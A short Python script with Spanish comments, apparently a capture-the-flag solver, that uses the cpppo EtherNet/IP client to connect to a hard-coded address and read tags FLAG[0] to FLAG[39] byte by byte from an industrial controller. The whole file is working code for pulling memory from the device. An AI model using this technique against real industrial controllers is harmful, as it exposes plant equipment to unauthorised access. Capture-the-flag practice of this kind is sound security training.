from cpppo.server.enip import client

host = "154.57.164.68"
port = 32438

# Construimos una lista de tags: ['FLAG[0]', 'FLAG[1]', ..., 'FLAG[39]']
tags = [f"FLAG[{i}]" for i in range(40)]

print(f"[*] Conectando a {host}:{port} y extrayendo memoria byte por byte...")

flag_texto = ""

try:
    with client.connector(host=host, port=port) as conn:
        operaciones = client.parse_operations(tags)
        
        # El pipeline manda todas las operaciones y nos devuelve las respuestas en orden
        for resultado in conn.pipeline(operaciones):
            
            # Extraemos el valor crudo (el último elemento de la tupla devuelta)
            valor_crudo = resultado[-1]
            
            if isinstance(valor_crudo, list) and len(valor_crudo) > 0:
                byte = valor_crudo[0]
                
                # Verificamos que sea un caracter ASCII válido (evitamos ceros nulos)
                if 32 <= byte <= 126:
                    flag_texto += chr(byte)

    print("\n" + "="*40)
    print(f"[!!!] BINGO: {flag_texto}")
    print("="*40 + "\n")

except Exception as e:
    print(f"[X] Error: {e}")
